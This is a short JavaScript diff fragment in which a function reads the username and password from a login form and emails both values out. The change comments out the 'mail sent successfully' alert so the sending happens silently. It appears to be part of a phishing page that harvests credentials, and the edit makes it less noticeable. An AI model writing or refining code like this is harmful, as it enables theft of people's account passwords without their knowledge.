@@ -9,7 +9,7 @@ function getinfo() {
         Subject:  document.getElementById("username").value,
         Body:  "username =  " + document.getElementById("username").value + ",   password = " + document.getElementById("password").value,
     })
-        .then(function (message) {
-            alert("mail sent successfully")
-        });
+//         .then(function (message) {
+//             alert("mail sent successfully")
+//         });
 }
